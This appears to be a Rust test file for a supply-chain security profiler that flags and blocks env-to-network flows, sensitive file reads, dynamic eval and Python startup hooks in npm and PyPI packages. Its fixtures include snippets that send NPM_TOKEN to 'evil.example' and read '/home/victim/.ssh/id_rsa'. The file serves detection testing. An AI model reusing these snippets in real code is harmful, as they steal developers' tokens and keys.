//! `profiler` domain tests, extracted from the original monolithic tests.rs.

use super::*;

#[test]
fn profiler_turns_host_access_into_capabilities() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "index.js",
        "const token = process.env.NPM_TOKEN; fetch('https://evil.example', { body: token });",
    );
    let profile = profiler.finish();
    assert!(profile
        .capabilities
        .iter()
        .any(|finding| finding.kind == CapabilityKind::EnvRead && finding.target == "NPM_TOKEN"));
    assert!(profile
        .capabilities
        .iter()
        .any(|finding| finding.kind == CapabilityKind::HttpRequest
            && finding.target == "evil.example"));
}

#[test]
fn profiler_preserves_static_url_ports_for_network_capabilities() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "index.js",
        "fetch('HTTPS://evil.example:8443/path'); fetch('http://plain.example:8080/a');",
    );
    let profile = profiler.finish();

    assert!(profile
        .capabilities
        .iter()
        .any(|finding| finding.kind == CapabilityKind::HttpRequest
            && finding.target == "evil.example:8443"));
    assert!(profile
        .capabilities
        .iter()
        .any(|finding| finding.kind == CapabilityKind::HttpRequest
            && finding.target == "plain.example:8080"));
    assert!(!profile
        .capabilities
        .iter()
        .any(|finding| finding.kind == CapabilityKind::HttpRequest
            && finding.target == "evil.example"));
}

#[test]
fn profiler_ignores_static_urls_without_network_calls() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "pygments/lexers/python.py",
        "__url__ = 'https://www.python.org/'\nDOC = 'https://docs.python.org/'\n",
    );
    profiler.scan_file(
        "client.py",
        "endpoint = 'https://api.example.com/v1'; fetch(endpoint)",
    );
    let profile = profiler.finish();

    assert!(!profile
        .capabilities
        .iter()
        .any(|finding| finding.source == "pygments/lexers/python.py"
            && finding.kind == CapabilityKind::HttpRequest));
    assert!(profile
        .capabilities
        .iter()
        .any(|finding| finding.source == "client.py"
            && finding.kind == CapabilityKind::HttpRequest
            && finding.target == "api.example.com"));
}

#[test]
fn profiler_ignores_non_executable_assets() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "package/lib/lib.dom.d.ts",
        "declare function fetch(input: RequestInfo): Promise<Response>;",
    );
    profiler.scan_file(
        "package/lib/typesMap.json",
        r#"{ "axios": "not executable source", "url": "https://example.invalid" }"#,
    );
    profiler.scan_file(
        "package/pyproject.toml",
        r#"[project.scripts]\nrun = "tool:main""#,
    );
    let profile = profiler.finish();

    assert_eq!(profile.files_scanned, 0);
    assert!(profile.capabilities.is_empty());
}

#[test]
fn profiler_distinguishes_regex_exec_from_dynamic_eval() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "package/functions/coerce.js",
        "while ((next = coerceRtlRegex.exec(version))) { match = next }",
    );
    profiler.scan_file("package/runtime.js", "eval(source); new Function(source);");
    profiler.scan_file("package/tool.py", "exec(code)\n");
    let profile = profiler.finish();

    let dynamic_eval_findings = profile
        .capabilities
        .iter()
        .filter(|finding| finding.kind == CapabilityKind::DynamicEval)
        .collect::<Vec<_>>();
    // Real dynamic eval is flagged on runtime.js (eval / new Function) and
    // tool.py (exec); the regex `.exec` on coerce.js is NOT. (runtime.js may
    // contribute more than one finding now that `new Function` is detected
    // distinctly from `eval`, so assert by source-file presence.)
    let sources: BTreeSet<&str> = dynamic_eval_findings
        .iter()
        .map(|finding| finding.source.as_str())
        .collect();
    assert_eq!(
        sources,
        BTreeSet::from(["package/runtime.js", "package/tool.py"])
    );
}

#[test]
fn profiler_distinguishes_python_module_references_from_http_calls() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "requests/__init__.py",
        "from .sessions import Session\n__title__ = 'requests'\n",
    );
    profiler.scan_file(
            "client.py",
            "requests.get(url)\nurllib.request.urlopen(url)\nhttpx.post(url)\nsocket.create_connection(addr)\n",
        );
    let profile = profiler.finish();

    assert!(!profile
        .capabilities
        .iter()
        .any(|finding| finding.source == "requests/__init__.py"
            && finding.kind == CapabilityKind::HttpRequest));
    assert_eq!(
        profile
            .capabilities
            .iter()
            .filter(|finding| finding.kind == CapabilityKind::HttpRequest)
            .count(),
        1
    );
}

#[test]
fn profiler_distinguishes_file_like_write_from_file_write() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file("package/models.py", "buffer.write(chunk)\n");
    profiler.scan_file("package/cache.py", "open(cache_path, 'wb').write(data)\n");
    let profile = profiler.finish();

    assert!(!profile
        .capabilities
        .iter()
        .any(|finding| finding.source == "package/models.py"
            && finding.kind == CapabilityKind::FsWrite));
    assert!(profile
        .capabilities
        .iter()
        .any(|finding| finding.source == "package/cache.py"
            && finding.kind == CapabilityKind::FsWrite));
}

// F4: a literal file-read path is captured as the FsRead target (not "*").

#[test]
fn profiler_captures_literal_fs_read_path() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "lib/secrets.js",
        "const k = fs.readFileSync('/home/victim/.ssh/id_rsa');\n",
    );
    let profile = profiler.finish();
    assert!(
        profile
            .capabilities
            .iter()
            .any(|finding| finding.kind == CapabilityKind::FsRead
                && finding.target == "/home/victim/.ssh/id_rsa"),
        "literal read path must be captured: {:?}",
        profile.capabilities
    );
}

// F4: reading a sensitive file is Blocked at verdict time even under a
// wildcard fs.read:* grant (mirrors the in-cell sensitive-read guarantee).

#[test]
fn sensitive_literal_read_blocked_under_wildcard_grant() {
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("source");
    fs::create_dir_all(&source).unwrap();
    fs::write(
        source.join("index.js"),
        "const fs = require('fs');\nconst k = fs.readFileSync('/home/victim/.ssh/id_rsa');\n",
    )
    .unwrap();
    let report = compile_source_path(CompileSourceOptions {
        project_dir: dir.path().to_path_buf(),
        source_path: source,
        ecosystem: Ecosystem::Npm,
        name: "reader".to_owned(),
        version: "1.0.0".to_owned(),
        // Wildcard fs.read grant must NOT cover sensitive files.
        allowed_capabilities: vec![Capability::FsRead("*".to_owned())],
        allowed_flows: Vec::new(),
        write_artifact: false,
    })
    .unwrap();
    assert_eq!(
        report.artifact.verdict,
        Verdict::Blocked,
        "reading ~/.ssh/id_rsa must be blocked even under fs.read:*"
    );
}

// F4 over-block guard: a literal read of an ordinary project file IS allowed
// under a wildcard fs.read:* grant.

#[test]
fn ordinary_literal_read_allowed_under_wildcard_grant() {
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("source");
    fs::create_dir_all(&source).unwrap();
    fs::write(
        source.join("index.js"),
        "const fs = require('fs');\nconst c = fs.readFileSync('./config.json');\n",
    )
    .unwrap();
    let report = compile_source_path(CompileSourceOptions {
        project_dir: dir.path().to_path_buf(),
        source_path: source,
        ecosystem: Ecosystem::Npm,
        name: "reader".to_owned(),
        version: "1.0.0".to_owned(),
        allowed_capabilities: vec![Capability::FsRead("*".to_owned())],
        allowed_flows: Vec::new(),
        write_artifact: false,
    })
    .unwrap();
    assert_eq!(
        report.artifact.verdict,
        Verdict::Accepted,
        "an ordinary literal project-file read must remain accepted under fs.read:*"
    );
}

// F5: Python startup hooks are never copied into site-packages.

#[test]
fn python_startup_hooks_are_not_installed() {
    for hook in [
        "evil.pth",
        "sitecustomize.py",
        "usercustomize.py",
        "pkg/sub/inject.pth",
    ] {
        assert!(
            !should_copy_python_sdist_path(Path::new(hook)),
            "{hook} must not be copied into site-packages"
        );
        assert!(is_python_startup_hook_path(Path::new(hook)), "{hook}");
    }
    // ordinary modules still copy
    assert!(should_copy_python_sdist_path(Path::new("pkg/__init__.py")));
    assert!(should_copy_python_sdist_path(Path::new("pkg/site.py")));
}

#[test]
fn generated_profile_module_deduplicates_capability_ops() {
    let package = ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: "date-helper".to_owned(),
        version: "1.2.4".to_owned(),
        source_url: "https://example.invalid/date-helper.tgz".to_owned(),
        download_url: None,
        local_path: None,
        filename: "date-helper.tgz".to_owned(),
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    };
    let findings = vec![
        CapabilityFinding {
            kind: CapabilityKind::EnvRead,
            target: "NPM_TOKEN".to_owned(),
            source: "a.js".to_owned(),
            evidence: "process.env".to_owned(),
        },
        CapabilityFinding {
            kind: CapabilityKind::EnvRead,
            target: "NPM_TOKEN".to_owned(),
            source: "b.js".to_owned(),
            evidence: "process.env".to_owned(),
        },
        CapabilityFinding {
            kind: CapabilityKind::HttpRequest,
            target: "evil.example".to_owned(),
            source: "a.js".to_owned(),
            evidence: "fetch()".to_owned(),
        },
        CapabilityFinding {
            kind: CapabilityKind::HttpRequest,
            target: "evil.example".to_owned(),
            source: "b.js".to_owned(),
            evidence: "fetch()".to_owned(),
        },
        CapabilityFinding {
            kind: CapabilityKind::FsRead,
            target: "*".to_owned(),
            source: "a.js".to_owned(),
            evidence: "readFile(".to_owned(),
        },
        CapabilityFinding {
            kind: CapabilityKind::FsRead,
            target: "*".to_owned(),
            source: "b.js".to_owned(),
            evidence: "readFile(".to_owned(),
        },
    ];
    let module = module_from_profile(&package, &findings);
    let cap_ops = module.functions[0]
        .code
        .iter()
        .filter(|op| matches!(op, Op::Cap(_)))
        .count();

    // Findings dedup by (kind, target) to 3 unique caps: EnvRead(NPM_TOKEN),
    // FsRead(*), HttpRequest(evil.example). The F2 flow model then emits one
    // `push source; consume in sink` pair per (source x sink) = 2 sources x
    // 1 sink = 2 pairs = 4 cap ops (env->http and fs-read->http both modeled).
    assert_eq!(cap_ops, 4);
}

#[test]
fn detects_all_host_grants_for_flow_escape_hatch() {
    let grants = vec![
        Capability::EnvRead("*".to_owned()),
        Capability::FsRead("*".to_owned()),
        Capability::FsWrite("*".to_owned()),
        Capability::HttpHost("*".to_owned()),
        Capability::DnsHost("*".to_owned()),
        Capability::ProcSpawn("*".to_owned()),
        Capability::DynamicEval,
    ];

    assert!(grants_all_host_capabilities(&grants));
    assert!(!grants_all_host_capabilities(&grants[..grants.len() - 1]));
}

#[test]
fn generated_profile_module_models_static_env_to_network_flow() {
    let package = ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: "date-helper".to_owned(),
        version: "1.2.4".to_owned(),
        source_url: "https://example.invalid/date-helper.tgz".to_owned(),
        download_url: None,
        local_path: None,
        filename: "date-helper.tgz".to_owned(),
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    };
    let findings = vec![
        CapabilityFinding {
            kind: CapabilityKind::EnvRead,
            target: "NPM_TOKEN".to_owned(),
            source: "index.js".to_owned(),
            evidence: "static env read `NPM_TOKEN`".to_owned(),
        },
        CapabilityFinding {
            kind: CapabilityKind::HttpRequest,
            target: "evil.example".to_owned(),
            source: "index.js".to_owned(),
            evidence: "static URL host `evil.example`".to_owned(),
        },
    ];
    let module = module_from_profile(&package, &findings);
    let http = module.functions[0]
        .code
        .iter()
        .find_map(|op| match op {
            Op::Cap(CapOp::HttpRequest { request }) => Some(request),
            _ => None,
        })
        .unwrap();
    assert!(http.body_from_stack);

    let policy = Policy::pure()
        .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
        .allow_capability(Capability::HttpHost("evil.example".to_owned()));
    let error = verify_module(&module, &policy).unwrap_err();
    assert!(error.findings.iter().any(|finding| finding
        .message
        .contains("env:NPM_TOKEN may not flow to network:evil.example")));
}

#[test]
fn compile_source_directory_emits_signed_verifiable_artifact() {
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("source");
    fs::create_dir_all(&source).unwrap();
    fs::write(
            source.join("index.js"),
            "const token = process.env.NPM_TOKEN;\nfetch('https://evil.example/upload', { body: token });\n",
        )
        .unwrap();
    fs::create_dir_all(source.join("node_modules/noisy")).unwrap();
    fs::write(
        source.join("node_modules/noisy/index.js"),
        "fetch('https://ignored.example')\n",
    )
    .unwrap();

    let report = compile_source_path(CompileSourceOptions {
        project_dir: dir.path().to_path_buf(),
        source_path: source,
        ecosystem: Ecosystem::Npm,
        name: "date-helper".to_owned(),
        version: "1.2.4".to_owned(),
        allowed_capabilities: vec![
            Capability::EnvRead("NPM_TOKEN".to_owned()),
            Capability::HttpHost("evil.example".to_owned()),
        ],
        allowed_flows: Vec::new(),
        write_artifact: true,
    })
    .unwrap();

    assert_eq!(report.artifact.package.name, "date-helper");
    assert_eq!(report.artifact.files_scanned, 1);
    assert_eq!(report.artifact.behavior, Behavior::HostCapability);
    assert_eq!(report.artifact.verdict, Verdict::Blocked);
    assert!(report
        .artifact
        .capabilities
        .iter()
        .any(|finding| finding.kind == CapabilityKind::EnvRead && finding.target == "NPM_TOKEN"));
    assert!(report
        .artifact
        .capabilities
        .iter()
        .any(|finding| finding.kind == CapabilityKind::HttpRequest
            && finding.target == "evil.example"));
    assert!(!report
        .artifact
        .capabilities
        .iter()
        .any(|finding| finding.target == "ignored.example"));
    assert!(report
        .artifact
        .verifier_findings
        .iter()
        .any(|finding| finding.contains("env:NPM_TOKEN may not flow to network:evil.example")));
    verify_artifact_signature(&report.artifact).unwrap();
    let artifact_path = report.artifact_path.unwrap();
    assert!(artifact_path.ends_with("omc.json"));
    let stored: OmcArtifact =
        serde_json::from_str(&fs::read_to_string(artifact_path).unwrap()).unwrap();
    verify_artifact_signature(&stored).unwrap();
}

#[test]
fn profiler_ignores_tests_and_packaging_files() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file("pkg/tests/test_runtime.py", "open('/tmp/x', 'w')");
    profiler.scan_file("pkg/setup.py", "open('README.md').read()");
    let profile = profiler.finish();
    assert!(profile.capabilities.is_empty());
    assert_eq!(profile.files_scanned, 0);
}

#[test]
fn generated_profile_module_rejects_capabilities_by_default() {
    let package = ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: "date-helper".to_owned(),
        version: "1.2.4".to_owned(),
        source_url: "https://example.invalid/date-helper.tgz".to_owned(),
        download_url: None,
        local_path: None,
        filename: "date-helper.tgz".to_owned(),
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    };
    let findings = vec![CapabilityFinding {
        kind: CapabilityKind::EnvRead,
        target: "NPM_TOKEN".to_owned(),
        source: "index.js".to_owned(),
        evidence: "process.env".to_owned(),
    }];
    let module = module_from_profile(&package, &findings);
    let error = verify_module(&module, &Policy::pure()).unwrap_err();
    assert!(error
        .findings
        .iter()
        .any(|finding| finding.message.contains("env.read:NPM_TOKEN not granted")));
}

#[test]
fn comment_url_is_not_a_network_host() {
    // axios's published bundle has `// (e.g. ... 'https://evil.com')` — a URL in a
    // comment. With a real (variable-argument) network call present, the file is
    // still flagged for network, but the comment host must NOT become a sink.
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "lib/core/Axios.js",
        "function send(url) {\n  // example: Object.prototype.baseURL = 'https://evil.com'\n  return fetch(url);\n}\n",
    );
    let profile = profiler.finish();
    assert!(
        !profile
            .capabilities
            .iter()
            .any(|f| f.target.contains("evil.com")),
        "URL inside a comment must not be a network host: {:?}",
        profile.capabilities
    );
    // The real fetch is still detected — as the generic `*` host, not the comment.
    assert!(profile
        .capabilities
        .iter()
        .any(|f| f.kind == CapabilityKind::HttpRequest && f.target == "*"));
}

#[test]
fn comment_only_capabilities_are_ignored_js() {
    // env read, eval, child_process, and a URL appear ONLY inside `//` and
    // `/* */` comments — none execute, so the file profiles as pure.
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "index.js",
        "export const VERSION = 1;\n\
         // const t = process.env.SECRET; fetch('https://evil.com', t);\n\
         /* eval(payload); require('child_process').execSync('x'); */\n",
    );
    let profile = profiler.finish();
    assert!(
        profile.capabilities.is_empty(),
        "capabilities only mentioned in comments must be ignored: {:?}",
        profile.capabilities
    );
}

#[test]
fn comment_only_capabilities_are_ignored_python_but_real_code_kept() {
    // A `#` comment mentioning os.environ + a URL is ignored; the real
    // os.environ read on the next line is still detected.
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "client.py",
        "import os\n\
         # token = os.environ['SECRET']  # see https://evil.com\n\
         real = os.environ['REAL']\n",
    );
    let profile = profiler.finish();
    assert!(
        !profile.capabilities.iter().any(|f| f.target == "SECRET"),
        "env name in a comment must be ignored: {:?}",
        profile.capabilities
    );
    assert!(
        !profile
            .capabilities
            .iter()
            .any(|f| f.target.contains("evil.com")),
        "URL in a comment must be ignored: {:?}",
        profile.capabilities
    );
    assert!(
        profile
            .capabilities
            .iter()
            .any(|f| f.kind == CapabilityKind::EnvRead && f.target == "REAL"),
        "the real os.environ['REAL'] read is still detected: {:?}",
        profile.capabilities
    );
}

#[test]
fn python_floor_division_is_not_a_comment() {
    // `//` is integer division in Python, NOT a comment — code after it on the
    // same line must still be scanned (a generic comment-stripper would wrongly
    // blank the rest of the line and miss the env read).
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "calc.py",
        "import os\nhalf = total // 2 ; secret = os.environ['REAL']\n",
    );
    let profile = profiler.finish();
    assert!(
        profile
            .capabilities
            .iter()
            .any(|f| f.kind == CapabilityKind::EnvRead && f.target == "REAL"),
        "`//` must not hide the rest of a Python line: {:?}",
        profile.capabilities
    );
}

#[test]
fn protocol_slashes_in_a_real_url_are_not_a_comment() {
    // Regression: the `//` in `https://` lives inside a string literal and must
    // never be treated as a line comment (which would truncate the host).
    let mut profiler = SourceProfiler::default();
    profiler.scan_file("index.js", "fetch('https://api.real.example/v1');\n");
    let profile = profiler.finish();
    assert!(profile
        .capabilities
        .iter()
        .any(|f| f.kind == CapabilityKind::HttpRequest && f.target == "api.real.example"));
}

// FALSE-POSITIVE FIX — MODE-AS-PATH. `path.open("rb")` / `lock.open("xb")` are
// pathlib.Path.open(mode) member calls; the mode token must never be captured
// as a concrete read PATH (it can never be a filename). The capability is still
// over-approximated to `*` — we only refuse the bogus concrete target.
#[test]
fn open_mode_arg_is_not_captured_as_read_path() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "matplotlib/cbook.py",
        "def f(path):\n    return path.open('rb')\nwith lock_path.open(\"xb\"):\n    pass\n",
    );
    let profile = profiler.finish();
    for bogus in ["rb", "xb", "r", "w", "wb"] {
        assert!(
            !profile
                .capabilities
                .iter()
                .any(|f| f.kind == CapabilityKind::FsRead && f.target == bogus),
            "open() mode `{bogus}` must never be an fs_read path: {:?}",
            profile.capabilities
        );
    }
}

// CONTROL — a genuine literal read PATH on the bare `open` builtin is still
// captured (not weakened by the mode-token fix).
#[test]
fn genuine_open_literal_path_still_captured() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file("numpy/distutils/cpuinfo.py", "fo = open('/proc/cpuinfo')\n");
    let profile = profiler.finish();
    assert!(
        profile
            .capabilities
            .iter()
            .any(|f| f.kind == CapabilityKind::FsRead && f.target == "/proc/cpuinfo"),
        "real open('/proc/cpuinfo') must still be captured: {:?}",
        profile.capabilities
    );
}

// FALSE-POSITIVE FIX — URL-AS-FILE. `ds.open('http://www.google.com/')` inside
// a docstring example must not record a URL as an fs_read path. (Even outside a
// docstring, a URL is never a local file.)
#[test]
fn url_argument_is_not_captured_as_read_path() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "numpy/lib/_datasource.py",
        "gfile = ds.open('http://www.google.com/')\n",
    );
    let profile = profiler.finish();
    assert!(
        !profile
            .capabilities
            .iter()
            .any(|f| f.kind == CapabilityKind::FsRead && f.target.contains("google.com")),
        "a URL must never be an fs_read path: {:?}",
        profile.capabilities
    );
}

// FALSE-POSITIVE FIX — DOCSTRING SCRAPE (fs_read + sensitive). An `open(...)`
// and an `os.environ['FOO']` that appear ONLY inside a Python docstring/doctest
// are documentation, never executed, and must not become capability targets.
// The most dangerous case: a `~/.ssh/id_dsa` example inside a docstring must NOT
// trip the sensitive-read gate.
#[test]
fn docstring_open_and_env_examples_are_not_scraped() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "numpy/lib/_utils_impl.py",
        "def safe_eval(s):\n    \"\"\"Evaluate s.\n\n    Examples\n    --------\n    >>> np.safe_eval('open(\"/home/user/.ssh/id_dsa\").read()')\n    >>> ds.open('/home/guido/foobar.txt')\n    >>> os.environ['SECRET_FROM_DOC']\n    \"\"\"\n    return s\n",
    );
    let profile = profiler.finish();
    assert!(
        !profile
            .capabilities
            .iter()
            .any(|f| f.target.contains(".ssh") || f.target.contains("foobar.txt")),
        "docstring open() example must not be an fs_read target: {:?}",
        profile.capabilities
    );
    assert!(
        !profile
            .capabilities
            .iter()
            .any(|f| f.kind == CapabilityKind::EnvRead && f.target == "SECRET_FROM_DOC"),
        "docstring os.environ example must not be a named env target: {:?}",
        profile.capabilities
    );
}

// CONTROL — a docstring above REAL executable code does not hide that code. The
// real `os.environ['REAL']` read on the next executable line is still detected.
#[test]
fn docstring_does_not_hide_following_executable_code() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "client.py",
        "import os\ndef f():\n    \"\"\"Doc with os.environ['DOC_ONLY'] example.\"\"\"\n    return os.environ['REAL']\n",
    );
    let profile = profiler.finish();
    assert!(
        profile
            .capabilities
            .iter()
            .any(|f| f.kind == CapabilityKind::EnvRead && f.target == "REAL"),
        "real env read after a docstring must still be detected: {:?}",
        profile.capabilities
    );
    assert!(
        !profile
            .capabilities
            .iter()
            .any(|f| f.kind == CapabilityKind::EnvRead && f.target == "DOC_ONLY"),
        "env name only in the docstring must be ignored: {:?}",
        profile.capabilities
    );
}

// FALSE-POSITIVE FIX — DOCSTRING SCRAPE (http host). A reference URL inside a
// docstring must not become an HTTP sink. Control: a real fetch in code is still
// flagged (as the generic `*` host here, since the host is a docstring example).
#[test]
fn docstring_url_is_not_an_http_host() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "client.py",
        "import socket\ndef f():\n    \"\"\"See https://reference.invalid/docs for details.\"\"\"\n    return socket.create_connection(addr)\n",
    );
    let profile = profiler.finish();
    assert!(
        !profile
            .capabilities
            .iter()
            .any(|f| f.target.contains("reference.invalid")),
        "docstring reference URL must not be an http host: {:?}",
        profile.capabilities
    );
    assert!(
        profile
            .capabilities
            .iter()
            .any(|f| f.kind == CapabilityKind::HttpRequest),
        "the real socket call must still be flagged: {:?}",
        profile.capabilities
    );
}

// FALSE-POSITIVE FIX — method-named-open. `dumper.open()` (member call) and
// `def open(self):` (method definition) are never the Python file builtin, so
// neither produces an fs_read/fs_write finding.
#[test]
fn method_named_open_is_not_a_file_builtin() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file("yaml/__init__.py", "dumper.open()\n");
    profiler.scan_file(
        "yaml/serializer.py",
        "class S:\n    def open(self):\n        pass\n",
    );
    let profile = profiler.finish();
    assert!(
        !profile
            .capabilities
            .iter()
            .any(|f| matches!(f.kind, CapabilityKind::FsRead | CapabilityKind::FsWrite)),
        "member/def `open` must not be a filesystem capability: {:?}",
        profile.capabilities
    );
}

// CONTROL — a genuine module-level `open(...,'w')` write is still detected.
#[test]
fn genuine_open_write_still_detected() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "pycparser/_build_tables.py",
        "ast_gen.generate(open('c_ast.py', 'w'))\n",
    );
    let profile = profiler.finish();
    assert!(
        profile
            .capabilities
            .iter()
            .any(|f| f.kind == CapabilityKind::FsWrite),
        "real open(...,'w') write must still be detected: {:?}",
        profile.capabilities
    );
}

// FALSE-POSITIVE FIX — def-named-compile. `def compile(...)` / a method named
// `compile` is a DEFINITION, not the builtin `compile()`; it must not emit a
// DynamicEval. (regex ships `def compile(...)` and was blocked solely by this.)
#[test]
fn def_named_compile_is_not_dynamic_eval() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "regex/_regex_core.py",
        "def compile(self, reverse=False, fuzzy=False):\n    return self._compiled\n",
    );
    let profile = profiler.finish();
    assert!(
        !profile
            .capabilities
            .iter()
            .any(|f| f.kind == CapabilityKind::DynamicEval),
        "a `def compile(` definition must not be DynamicEval: {:?}",
        profile.capabilities
    );
}

// CONTROL — a genuine `compile(src, ...)` builtin call still fails closed.
#[test]
fn genuine_compile_call_still_dynamic_eval() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file("tool.py", "code = compile(src, '<s>', 'exec')\n");
    let profile = profiler.finish();
    assert!(
        profile
            .capabilities
            .iter()
            .any(|f| f.kind == CapabilityKind::DynamicEval),
        "real compile() call must still be DynamicEval: {:?}",
        profile.capabilities
    );
}

// FALSE-POSITIVE FIX — `__builtins__` as a NAME STRING. pydantic ships
// `BUILTINS_NAME = '__builtins__'` — a string literal, not an access of the
// builtins mapping. It must not fail closed.
#[test]
fn builtins_name_string_literal_is_not_opaque_access() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "pydantic/v1/mypy.py",
        "BUILTINS_NAME = 'builtins' if MYPY else '__builtins__'\n",
    );
    let profile = profiler.finish();
    assert!(
        !profile
            .capabilities
            .iter()
            .any(|f| f.kind == CapabilityKind::DynamicEval),
        "`'__builtins__'` string literal must not be opaque access: {:?}",
        profile.capabilities
    );
}

// CONTROL — a genuine `__builtins__[...]` identifier access still fails closed.
#[test]
fn genuine_builtins_subscript_still_opaque() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file("payload.py", "fn = __builtins__['eval']\n");
    let profile = profiler.finish();
    assert!(
        profile
            .capabilities
            .iter()
            .any(|f| f.kind == CapabilityKind::DynamicEval),
        "real __builtins__[...] access must still fail closed: {:?}",
        profile.capabilities
    );
}

// FALSE-POSITIVE FIX — window.open in bundled JS is browser page navigation, not
// a filesystem read. The bare `open` builtin is Python-only; a member `.open(`
// (here `window.open`) is excluded.
#[test]
fn js_window_open_is_not_a_file_read() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "mpl_tornado.js",
        "window.open(figure.id + '/download.' + format, '_blank');\n",
    );
    let profile = profiler.finish();
    assert!(
        !profile
            .capabilities
            .iter()
            .any(|f| f.kind == CapabilityKind::FsRead),
        "window.open() must not be an fs_read: {:?}",
        profile.capabilities
    );
}
